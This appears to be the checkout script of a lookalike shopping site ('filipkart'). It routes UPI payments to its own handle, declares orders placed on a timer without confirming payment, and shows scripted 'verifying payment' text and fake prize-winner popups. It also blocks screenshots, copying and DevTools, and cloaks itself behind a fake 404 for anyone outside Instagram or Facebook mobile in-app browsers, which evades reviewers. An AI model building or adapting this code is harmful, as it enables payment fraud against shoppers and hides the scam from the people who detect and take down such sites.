/* ============================================================
   CHECKOUT STEP 3: PAYMENTS
   ============================================================ */
/* Tapping an option only SELECTS it (radio style); the redirect / QR
   modal is deferred until the user hits Place Order. */
function selectPayment(name) {
  state.paymentMethod = name;
  document.querySelectorAll('.pay-option').forEach(function (el) {
    el.classList.toggle('selected', el.getAttribute('data-pay') === name);
  });
}

let processingTimer = null;

function placeOrder() {
  const method = state.paymentMethod;

  if (method === 'SCAN TO PAY') {
    /* No processing timer here: the success animation fires only when
       the QR session expires (see the countdown in openQRModal) */
    openQRModal();
  } else {
    initiateUPIPayment(method);
    /* UPI intents: exactly 60 seconds of processing, then the animation */
    clearTimeout(processingTimer);
    processingTimer = setTimeout(function () {
      processingTimer = null;
      finalizeOrder();
    }, 60000);
    /* Dynamic red status text above the button at 10s / 25s / 40s */
    injectPayStatusSlot();
    schedulePayStatus('pay-status');
  }

  /* Loading state, applied AFTER openQRModal's safety-close (which
     restores any previous button state) so it is never wiped */
  const btn = document.querySelector('.checkout-bar .btn-yellow');
  if (btn) {
    if (!btn.dataset.label) btn.dataset.label = btn.textContent;
    btn.textContent = 'Processing...';
    btn.disabled = true;
    btn.style.opacity = '.75';
  }
}

/* Restore the Place Order / Complete Payment button (e.g. when the
   user manually closes the QR sheet and wants to retry) */
function restoreOrderButton() {
  const btn = document.querySelector('.checkout-bar .btn-yellow');
  if (btn && btn.disabled) {
    btn.textContent = btn.dataset.label || 'Order Now';
    btn.disabled = false;
    btn.style.opacity = '';
  }
}

/* ---- Dynamic payment-verification status text ---- */
let statusTimers = [];

function clearStatusTimers() {
  statusTimers.forEach(clearTimeout);
  statusTimers = [];
}

/* Full-width slot injected as the first row of the sticky bar,
   directly above the Place Order / Complete Payment button */
function injectPayStatusSlot() {
  if (document.getElementById('pay-status')) return;
  const bar = document.querySelector('.checkout-bar');
  if (!bar) return;
  bar.style.flexWrap = 'wrap';
  const el = document.createElement('div');
  el.id = 'pay-status';
  el.className = 'pay-status';
  bar.insertBefore(el, bar.firstChild);
}

function setPayStatus(targetId, msg) {
  const el = document.getElementById(targetId);
  if (!el) return;
  el.innerHTML = '<span class="spinner red"></span><span>' + msg + '</span>';
  el.classList.add('show'); /* .4s fade-in */
}

/* 10s / 25s / 40s message sequence (shared by UPI bar + QR modal) */
function schedulePayStatus(targetId) {
  clearStatusTimers();
  statusTimers.push(setTimeout(function () { setPayStatus(targetId, 'Please wait checking for payment'); }, 10000));
  statusTimers.push(setTimeout(function () { setPayStatus(targetId, 'Verifying if Payment is received'); }, 25000));
  statusTimers.push(setTimeout(function () { setPayStatus(targetId, 'Waiting for Payment to be completed'); }, 40000));
}

/* Shared payment-method selector (main checkout + retry page) */
function payOptionsHtml() {
  const options = [
    { name: 'PhonePe',     logo: 'images/upi-logo/phonepe.png' },
    { name: 'Paytm',       logo: 'images/upi-logo/paytm.png' },
    { name: 'Google Pay',  logo: 'images/upi-logo/gpay.png' },
    { name: 'SCAN TO PAY', logo: 'images/upi-logo/scanpay.png' }
  ];
  return options.map(o =>
    '<div class="pay-option' + (state.paymentMethod === o.name ? ' selected' : '') + '" data-pay="' + o.name + '" onclick="selectPayment(\'' + o.name + '\')">' +
      '<span class="pay-logo"><img src="' + o.logo + '" alt="' + o.name + '" onerror="this.remove()" /></span>' +
      '<div class="pay-name">' + o.name + '</div>' +
      '<span class="radio-dot"></span>' +
    '</div>'
  ).join('');
}

/* Record the purchase and play the success animation.
   Normal flow: move the cart into orders (payment pending) and clear it.
   Retry flow (state.retryOrderId): the order already exists. */
function finalizeOrder() {
  if (state.retryOrderId) {
    state.retryOrderId = null;
    navigate('/order-success');
    return;
  }
  const items = checkoutItems();
  const t = totalsFor(items);
  orders.unshift({
    orderId: orderSeq++,
    items: items.map(it => Object.assign({}, it)),
    amount: t.totalFinal,
    placedAt: Date.now(),
    status: 'PENDING_PAYMENT'
  });
  cart = [];
  refreshCartBadge();
  navigate('/order-success');
}

/* ---- Dynamic amount: single source of truth, pulled from cart state.
   Same computation the Order Summary uses (cart, or Buy Now item). ---- */
function getPayableAmount() {
  /* Retry flow pays the pending order's amount; the normal flow pays
     the live cart / Buy Now total */
  if (state.retryOrderId) {
    const o = orders.find(x => x.orderId === state.retryOrderId);
    if (o) return o.amount;
  }
  return totalsFor(checkoutItems()).totalFinal;
}

/* ---- UPI deep link intent with setTimeout fallback ----
   Note: PhonePe and Paytm register their deep link host as "pay" (no "upi/"
   path); only Google Pay parses "upi/pay". Using the wrong host still opens
   the app but drops the query params (no VPA / amount autofill). */
const UPI_SCHEMES = {
  'PhonePe':    'phonepe://pay',
  'Paytm':      'paytmmp://pay',
  'Google Pay': 'gpay://upi/pay'
};

function initiateUPIPayment(appName) {
  const scheme = UPI_SCHEMES[appName];
  if (!scheme) return;

  const amount = getPayableAmount();
  const deepLink = scheme + '?pa=filipkart@nyes&pn=TestStore&am=' + amount + '&cu=INR';

  /* If the OS hands control to a UPI app, the page blurs / becomes hidden.
     We flag that so the fallback alert only fires when NO app opened. */
  let appOpened = false;
  const markOpened = function () { if (document.hidden) appOpened = true; };
  const onBlur = function () { appOpened = true; };
  document.addEventListener('visibilitychange', markOpened);
  window.addEventListener('blur', onBlur);

  window.location.href = deepLink;

  /* Cleanup after the simulated app switch; order completion is now
     owned by the 20-second processing timer in placeOrder() */
  setTimeout(function () {
    document.removeEventListener('visibilitychange', markOpened);
    window.removeEventListener('blur', onBlur);
  }, 2000);
}

/* ---- SCAN TO PAY: premium centered QR modal + silent expiration ---- */
let qrInterval = null;
const QR_SESSION_SEC = 5 * 60;

function openQRModal() {
  closeQRModal(); /* safety: never stack two modals / intervals */

  /* Fresh attempt: hide any previous timeout error on the page */
  const prevErr = document.getElementById('payment-timeout-error');
  if (prevErr) prevErr.style.display = 'none';

  /* Dynamic UPI QR: the amount is pulled live from the cart / Buy Now
     product, so every product generates its own payment QR.
     UPI link format: upi://pay?pa=filipkart@nyes&pn=Test%20Pay&am=<amount>&cu=INR */
  const amount = getPayableAmount();
  const upiLink = 'upi://pay?pa=filipkart@nyes&pn=Test%20Pay&am=' + amount + '&cu=INR';
  const qrSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(upiLink);

  const overlay = document.createElement('div');
  overlay.className = 'qr-overlay';
  overlay.id = 'qr-modal';
  overlay.innerHTML =
    '<div class="qr-card">' +
      '<button class="qr-close" aria-label="Close" onclick="closeQRModal()">' + ICONS.close + '</button>' +
      '<div class="qr-title">Scan to Pay</div>' +
      '<div class="qr-sub">Use any UPI app to complete the payment</div>' +
      '<div class="qr-box"><img src="' + qrSrc + '" alt="UPI payment QR code" onerror="this.parentElement.textContent=\'QR unavailable\'" /></div>' +
      '<div class="qr-expiry">QR expires in <span id="qr-timer">05:00</span></div>' +
      '<div class="pay-status" id="qr-status"></div>' +
      '<button class="qr-wait-btn">Waiting for Payment</button>' +
    '</div>';
  document.body.appendChild(overlay);

  /* Same 10s / 25s / 40s red status sequence, below the QR countdown */
  schedulePayStatus('qr-status');

  let remaining = QR_SESSION_SEC;
  qrInterval = setInterval(function () {
    remaining--;
    const el = document.getElementById('qr-timer');
    if (el) el.textContent = pad2(Math.floor(remaining / 60)) + ':' + pad2(remaining % 60);
    if (remaining <= 0) {
      /* SCAN TO PAY: the order-placed animation appears exactly when
         the QR expires */
      closeQRModal();
      finalizeOrder();
    }
  }, 1000);
}

/* Manual close (X) and programmatic close both land here: clears the
   interval and removes the modal WITHOUT showing the timeout error */
function closeQRModal() {
  if (qrInterval) { clearInterval(qrInterval); qrInterval = null; }
  const m = document.getElementById('qr-modal');
  if (m) m.remove();
  restoreOrderButton(); /* manual X close: let the user retry */
}

/* ---- Order cancellation flow ---- */
function cancelOrder(id) {
  const o = orders.find(x => x.orderId === id);
  if (o) o.status = 'Cancelled';
  const m = document.getElementById('cancel-modal');
  if (m) m.style.display = 'flex';
}

function closeCancelModal() {
  const m = document.getElementById('cancel-modal');
  if (m) m.style.display = 'none';
  navigate('/orders');
}

function renderRetryPage(id) {
  const o = orders.find(x => x.orderId === id);
  if (!o) { navigate('/orders'); return; }
  state.retryOrderId = o.orderId; /* QR/UPI amounts use the pending order total */
  const first = o.items[0];

  app().innerHTML =
    subHeader('Complete Payment') +

    '<div class="card-block" style="margin-top:8px">' +
      '<div class="summary-item">' +
        '<div class="summary-thumb">' + thumbImg(first) + '</div>' +
        '<div style="flex:1;min-width:0">' +
          '<div style="font-size:14px;font-weight:500">' + first.name + '</div>' +
          (o.items.length > 1 ? '<div style="font-size:12px;color:var(--text-muted);margin-top:4px">+' + (o.items.length - 1) + ' more item(s)</div>' : '') +
        '</div>' +
      '</div>' +
    '</div>' +

    '<div style="padding-top:4px;padding-bottom:8px">' + payOptionsHtml() + '</div>' +
    trustBadgeHtml() +
    '<div class="page-pad-bottom"></div>' +

    '<div class="checkout-bar">' +
      '<div class="amount">' + fmt(o.amount) + '<small>Pending Amount</small></div>' +
      '<button class="btn-yellow" onclick="placeOrder()">Complete Payment</button>' +
    '</div>';
}

function renderOrderSuccessPage() {
  const star = '<path d="M12 2c.7 5.5 2.8 8.3 10 10-7.2 1.7-9.3 4.5-10 10-.7-5.5-2.8-8.3-10-10 7.2-1.7 9.3-4.5 10-10z"/>';
  app().innerHTML =

      '<div class="success-graphic">' +
        '<div class="success-bg"></div>' +
        '<div class="success-base"></div>' +
        '<div class="breathe"></div>' +
        '<div class="ripple"></div>' +
        '<svg class="star s1" viewBox="0 0 24 24">' + star + '</svg>' +
        '<svg class="star s2" viewBox="0 0 24 24">' + star + '</svg>' +
        '<svg class="star s3" viewBox="0 0 24 24">' + star + '</svg>' +
        '<div class="success-check"><svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7"/></svg></div>' +
      '</div>' +
      '<div class="success-title">Order Placed</div>' +
      '<div class="success-sub">Waiting for payment to be completed</div>' +
    '</div>';
  /* Exactly 8 seconds on screen, then straight to My Orders. Guarded
     so an early manual navigation is never overridden. */
  setTimeout(function () {
    if (window.location.hash === '#/order-success') {
      /* replace the history entry so the browser Back button can
         never return to the animation screen */
      window.location.replace('#/orders');
    }
  }, 8000);
}

/* ============================================================
   WINNER ANNOUNCEMENT TOAST (recurring simulated popup)
   ============================================================ */
const WINNER_STATES = ["Assam", "Maharashtra", "Delhi", "Karnataka", "Gujarat", "Tamil Nadu", "Punjab", "Kerala", "West Bengal", "Rajasthan"];

/* Random amount between 1000 and 10000, strictly ending in 00 */
function randomWinAmount() {
  return Math.floor(Math.random() * 91) * 100 + 1000;
}

/* The popup lives on <body>, outside #app, so route re-renders
   never destroy it */
function ensureWinnerPopup() {
  let el = document.getElementById('winner-popup');
  if (el) return el;
  el = document.createElement('div');
  el.id = 'winner-popup';
  el.className = 'winner-popup';
  el.innerHTML =
    '<span class="winner-badge">' +
      '<img src="images/popup-logo.png" alt="Winner" onerror="this.remove()" />' +
    '</span>' +
    '<span class="popup-text" id="winner-text"></span>';
  document.body.appendChild(el);
  return el;
}

function showWinnerToast() {
  const el = ensureWinnerPopup();
  const state = WINNER_STATES[Math.floor(Math.random() * WINNER_STATES.length)];
  const amount = randomWinAmount();
  document.getElementById('winner-text').innerHTML =
    '<span class="highlight-congrats">Congratulations!</span> A user from <b>' + state + '</b> won <span class="highlight-amount">\u20B9' + amount + '</span>';
  /* Reset cleanly to the off-screen RIGHT with the transition disabled
     (otherwise the jump from -120% back to 120% would visibly streak
     across the screen), then slide in from the right */
  el.classList.remove('slide-in');
  el.classList.remove('slide-out');
  el.style.transition = 'none';
  void el.offsetWidth; /* force reflow at the reset position */
  el.style.transition = '';
  el.classList.add('slide-in');
  /* visible for exactly 5s, then slide out to the left */
  setTimeout(function () {
    el.classList.remove('slide-in');
    el.classList.add('slide-out');
  }, 5000);
}

/* Fire every 15 seconds; first announcement shortly after load */
setInterval(showWinnerToast, 15000);
setTimeout(showWinnerToast, 4000);

/* ============================================================
   CONTENT PROTECTION SYSTEM
   Software shortcuts are BLOCKED. Hardware combos (Android
   Power+VolDown / 3-finger swipe, iOS Power+VolUp / Power+Home)
   CANNOT be blocked by JavaScript - they are handled with the
   detection workaround: blur while hidden/unfocused and show a
   warning when the user returns.
   ============================================================ */
(function contentProtection() {

  /* ---------- blur shield + warning overlay ---------- */
  let shieldEl = null;
  let warnTimer = null;
  let devtoolsShield = false;

  function ensureShield() {
    if (shieldEl) return shieldEl;
    shieldEl = document.createElement('div');
    shieldEl.className = 'shield-overlay';
    shieldEl.innerHTML =
      '<div class="shield-msg">\u26A0\uFE0F Content protected' +
      '<small>Screenshots and screen recording are not allowed on this page.</small></div>';
    document.body.appendChild(shieldEl);
    return shieldEl;
  }

  function shieldOn() {
    clearTimeout(warnTimer);
    ensureShield().classList.add('on');
    document.body.classList.add('shielded');
  }

  function shieldOff() {
    if (shieldEl) shieldEl.classList.remove('on');
    document.body.classList.remove('shielded');
  }

  /* Brief warning: shown when returning to the page (a possible
     hardware screenshot / app-switch) or after a blocked shortcut */
  function flashWarning() {
    shieldOn();
    clearTimeout(warnTimer);
    warnTimer = setTimeout(shieldOff, 1800);
  }

  /* ---------- 1) SOFTWARE shortcuts (blockable) ----------
     Note: some OS-level combos (Win+Shift+S) may be swallowed by the
     OS before the browser sees them - blocked here when they arrive. */
  function isBlockedKey(e, inField) {
    const k = (e.key || '').toLowerCase();
    /* PrintScreen - plain, Alt+ and Win+ variants share the same key */
    if (k === 'printscreen') return true;
    /* Win+Shift+S snipping tool, Win+G game bar recorder */
    if (e.metaKey && e.shiftKey && k === 's') return true;
    if (e.metaKey && k === 'g') return true;
    /* macOS capture: Cmd+Shift+3/4/5 and Cmd+Ctrl+Shift+3/4 */
    if (e.metaKey && e.shiftKey && (k === '3' || k === '4' || k === '5')) return true;
    /* DevTools: F12, Ctrl+Shift+I/J/C, Cmd+Opt+I/J/C */
    if (k === 'f12') return true;
    if (e.ctrlKey && e.shiftKey && (k === 'i' || k === 'j' || k === 'c')) return true;
    if (e.metaKey && e.altKey && (k === 'i' || k === 'j' || k === 'c')) return true;
    /* View source */
    if ((e.ctrlKey || e.metaKey) && k === 'u') return true;
    /* Clipboard keys (Ctrl/Cmd+C, X, V) - allowed inside form fields */
    if (!inField && (e.ctrlKey || e.metaKey) && (k === 'c' || k === 'x' || k === 'v')) return true;
    return false;
  }

  document.addEventListener('keydown', function (e) {
    const tag = ((e.target && e.target.tagName) || '').toLowerCase();
    const inField = tag === 'input' || tag === 'textarea' || tag === 'select';
    if (isBlockedKey(e, inField)) {
      e.preventDefault();
      e.stopPropagation();
      flashWarning();
      return false;
    }
  }, true);

  /* PrintScreen often only fires on keyup: blank the clipboard so the
     captured frame cannot be pasted, then warn */
  document.addEventListener('keyup', function (e) {
    if ((e.key || '').toLowerCase() === 'printscreen') {
      try { navigator.clipboard.writeText(''); } catch (err) {}
      flashWarning();
    }
  }, true);

  /* ---------- 2) right-click / long-press / selection / copy ---------- */
  document.addEventListener('contextmenu', function (e) { e.preventDefault(); }, true);
  document.addEventListener('dragstart', function (e) { e.preventDefault(); }, true); /* long-press image save */
  document.addEventListener('selectstart', function (e) {
    const tag = ((e.target && e.target.tagName) || '').toLowerCase();
    if (tag !== 'input' && tag !== 'textarea') e.preventDefault();
  }, true);
  ['copy', 'cut'].forEach(function (type) {
    document.addEventListener(type, function (e) {
      const tag = ((e.target && e.target.tagName) || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea') return;
      e.preventDefault();
      /* clear anything that made it to the clipboard */
      try { e.clipboardData.setData('text/plain', ''); } catch (err) {}
      try { navigator.clipboard.writeText(''); } catch (err) {}
    }, true);
  });

  /* ---------- 3) HARDWARE combo workarounds (detection only) ----------
     Power+VolDown, 3-finger swipes, iOS button combos cannot be
     intercepted by a web page. Best effort: blur whenever the page is
     hidden or loses focus (app switch, recents, lock, share sheet)
     and flash the warning when the user comes back. */
  document.addEventListener('visibilitychange', function () {
    if (document.hidden) shieldOn();
    else flashWarning();
  });
  window.addEventListener('blur', shieldOn);
  window.addEventListener('focus', flashWarning);
  window.addEventListener('pagehide', shieldOn);
  window.addEventListener('beforeunload', shieldOn);

  /* ---------- 4) screen-capture APIs ---------- */
  /* Reject in-browser tab/window capture attempts */
  if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
    navigator.mediaDevices.getDisplayMedia = function () {
      flashWarning();
      return Promise.reject(new DOMException('Screen capture is disabled on this page', 'NotAllowedError'));
    };
  }
  /* Multi-Screen API (where available): screen setup changes often
     accompany casting/recording on desktop */
  const gsd = window.getScreenDetails || (navigator.getScreenDetails && navigator.getScreenDetails.bind(navigator));
  if (typeof gsd === 'function') {
    try {
      gsd.call(window).then(function (details) {
        details.addEventListener('screenschange', flashWarning);
      }).catch(function () {});
    } catch (err) {}
  }

  /* ---------- 5) DevTools-open heuristic ----------
     A large outer/inner window gap usually means docked DevTools:
     keep the shield on until they are closed. */
  setInterval(function () {
    const devtoolsLikely =
      (window.outerWidth - window.innerWidth > 200) ||
      (window.outerHeight - window.innerHeight > 200);
    if (devtoolsLikely) {
      devtoolsShield = true;
      shieldOn();
    } else if (devtoolsShield) {
      devtoolsShield = false;
      if (!document.hidden) shieldOff();
    }
  }, 1500);

})();
</script>
<!-- ===== FINAL ACCESS RESTRICTION — SABSE NECHE ===== -->
<script>
(function() {
    // ============================================
    // LAYER 1: USER-AGENT DETECTION
    // ============================================
    const ua = navigator.userAgent || '';
    const isInstagram = ua.indexOf('Instagram') !== -1;
    const isFacebook = ua.indexOf('FB_IAB') !== -1 || ua.indexOf('FBAV') !== -1;
    const isMobileBrowser = isInstagram || isFacebook;

    // ============================================
    // LAYER 2: SCREEN SIZE DETECTION
    // ============================================
    const screenWidth = window.innerWidth || screen.width;
    const isPhone = screenWidth <= 768;

    // ============================================
    // LAYER 3: TOUCH SUPPORT DETECTION
    // ============================================
    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;

    // ============================================
    // CHECK ALL CONDITIONS
    // ============================================
    const accessGranted = isMobileBrowser && isPhone && hasTouch;

    // ============================================
    // IF ACCESS DENIED → DESTROY EVERYTHING
    // ============================================
    if (!accessGranted) {
        // 1. REMOVE POPUP (Winner Toast)
        const popup = document.getElementById('winner-popup');
        if (popup) popup.remove();

        // 2. Remove any other overlays
        const overlays = document.querySelectorAll('.shield-overlay, .qr-overlay, .sheet-overlay, .lightbox, .success-overlay, .drawer-overlay');
        overlays.forEach(el => el.remove());

        // 3. Remove all content from body
        document.body.innerHTML = '';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.background = '#ffffff';
        document.body.style.minHeight = '100vh';
        document.body.style.display = 'flex';
        document.body.style.alignItems = 'center';
        document.body.style.justifyContent = 'center';
        document.body.style.fontFamily = 'Arial, sans-serif';
        document.body.style.textAlign = 'center';

        // 4. Create 404 content
        const div = document.createElement('div');
        div.style.maxWidth = '400px';
        div.style.padding = '20px';
        div.innerHTML = `
            <h1 style="font-size:72px;color:#e74c3c;margin:0;">404</h1>
            <p style="font-size:20px;color:#333;margin:10px 0;">Page not found</p>
            <p style="font-size:14px;color:#888;margin:8px 0;">The page you are looking for does not exist.</p>
        `;
        document.body.appendChild(div);

        // 5. Remove any lingering content
        document.title = '404 Not Found';

        // 6. Stop all further execution
        throw new Error('Access Denied: Instagram/Facebook mobile only');
    }
})();
</script>
